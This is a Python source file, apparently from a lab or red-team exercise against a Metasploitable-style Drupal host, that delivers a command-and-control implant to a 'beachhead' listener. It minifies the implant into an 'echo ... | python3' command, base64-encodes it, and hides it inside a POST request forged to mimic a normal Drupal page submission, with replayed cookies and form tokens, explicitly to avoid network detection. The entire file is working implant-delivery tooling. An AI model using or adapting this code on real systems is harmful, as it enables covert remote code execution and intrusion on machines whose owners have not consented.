import pathlib
import python_minifier
from base64 import b64encode

import requests

PARENT_DIR = str(pathlib.Path(__file__).parent.absolute().parent.absolute()) + "/"


class BeachheadSender:
    """A class to send the Command and Control implant to the beachhead on the target machine"""

    def __init__(
        self, ip_addr: str, port: str, drupal_path: str, implant_file_path: str
    ):
        """Initializes the BeachheadSender class

        This function will load the Command and Control implant from the given file path, and create a request
        to send it to the beachhead on the target machine.  The request will be stored in the request attribute,
        but will not be sent until the send_request function is called.
        """

        self.implant = self.load_implant(PARENT_DIR + implant_file_path)
        print("BEACHHEAD SENDER: implant created")

        self.request = self.create_request(ip_addr, port, drupal_path)
        print("BEACHHEAD SENDER: request created")

    def load_implant(self, implant_file_path: str):
        """Loads the Command and Control implant from the given file path"""

        with open(implant_file_path, "r") as f:
            filedata = python_minifier.minify(f.read())
        return 'echo "' + filedata + '" | python3'

    def create_request(
        self, ip_addr: str, port: str, path: str
    ) -> requests.models.Response:
        """Creates a request to send the Command and Control implant to the beachhead on the target machine

        The request will be stored in the request attribute, but will not be sent until the send_request function is called.

        The request was created to match a request that updates a normal page on the Drupal site.  This was done to make
        it less likely that the request would be detected by and network monitoring.  The initial activity was captured using
        Burp Suite, and then the request was modified to include the Command and Control implant.

        The request is, however, sent to the port that the beachhead is listening on, and the path is the path to the
        web site.  The beachhead will then intercept the request and extract the Command and Control implant from it.
        """

        url = "http://" + ip_addr + ":" + port + path

        # Mimics an add page request
        params = {"node": "node/add/page", "render": "overlay", "render": "overlay"}

        # The headers from the initial request, including a false Session ID
        headers = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "http://10.0.2.15",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer": "http://10.0.2.15/drupal/?q=node%2Fadd%2Fpage&render=overlay",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "Drupal.toolbar.collapsed=0; has_js=1; SESS3969c8b8b86a6735bbdf41499ed4dd1c=3egn8nOWzcqKC5eYSugFZt4YX9FXZ7m0aI45cswH0SQ",
            "Connection": "close",
        }

        # The implant is encoded in base64 to make it easier to send in the request
        implant = b64encode(self.implant.encode("utf-8")).decode("utf-8")

        # The data from the initial request, with the implant added
        data = "title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B"
        data += (
            "value%5D=" + implant + "&body%5Bund%5D%5B0%5D%5Bformat%5D=filtered_html"
        )
        data += (
            "&changed=&form_build_id=form-Btb_rPnHyH8wIkN0Bxu1chQt1WfW5fb8RwYdJL_oCEw"
        )
        data += "&form_token=10P20EX9YbXxbyg5B6xWVuv-NNavqFkNUKH8SG5Rqus&form_id=page_node_form"
        data += "&menu%5Blink_title%5D=&menu%5Bdescription%5D=&menu%5Bparent%5D=main-menu%3A0"
        data += "&menu%5Bweight%5D=0&log=&path%5Balias%5D=&comment=1&name=metasploitable&date="
        data += "&status=1&additional_settings__active_tab=edit-menu&op=Save"

        # Return the prepared request without sending it
        return requests.Request(
            "POST", url=url, headers=headers, params=params, data=data
        )

    def send_request(self) -> requests.models.Response:
        """Sends the request to the beachhead on the target machine

        Loads the request from the request attribute, and sends it to the beachhead on the target machine.

        Since the beachhead doesn't send back any acknowledgement that it received the request, this function will
        catch the error that is thrown when the request is closed with no response, and print a message to the console.
        """

        s = requests.Session()

        # Beachhead reveiver doesn't call home on its own, so don't wait for it
        try:
            prepped = s.prepare_request(self.request)
            s.send(prepped, verify=False, timeout=1)
            print("BEACHHEAD SENDER: cnc sent")

        except requests.exceptions.ConnectionError and requests.exceptions.ReadTimeout:
            pass


if __name__ == "__main__":
    sender = BeachheadSender(
        ip_addr="10.0.2.46",
        port="8081",
        drupal_path="/drupal",
        implant_file_path="test/cnc_test3.py",
    )
    # print(sender.implant)
    sender.send_request()
